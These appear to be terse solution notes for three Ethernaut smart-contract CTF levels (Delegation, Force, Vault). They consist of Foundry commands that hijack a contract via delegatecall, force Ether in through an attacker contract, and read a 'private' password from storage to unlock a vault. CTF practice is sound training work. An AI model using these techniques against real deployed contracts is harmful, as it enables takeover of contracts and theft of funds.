# Ethernaut

## Delegation

```bash
cast send <TARGET_CONTRACT> "pwn()"
```

## Forge

```bash
# Deploy
forge create ForceAttacker --constructor-args <TARGET_CONTRACT>

# Attack
cast send --value 0.01ether <ATTACKER_CONTRACT>
```

## Vault

```bash
PASSWORD=$(cast storage 0x19750Da423914182425B8F16E00A9ADDc6fd493d 1)
cast send <TARGET_CONTRACT> "unlock(bytes32)" "$PASSWORD"
```
